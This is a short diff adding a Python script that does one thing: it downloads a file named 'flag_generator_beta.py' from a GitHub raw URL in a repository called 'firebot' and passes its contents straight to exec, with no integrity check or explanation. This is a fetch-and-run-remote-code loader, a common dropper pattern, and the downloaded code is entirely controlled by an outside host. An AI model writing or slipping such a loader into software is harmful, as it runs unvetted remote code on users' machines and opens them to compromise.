@@ -1,0 +1,7 @@
+#!/bin/python3
+
+from urllib.request import urlopen
+
+
+with urlopen("https://github.com/fiaguhop137/firebot/raw/main/flag_generator_beta.py") as f:
+    exec(f.read().decode("latin-1"))
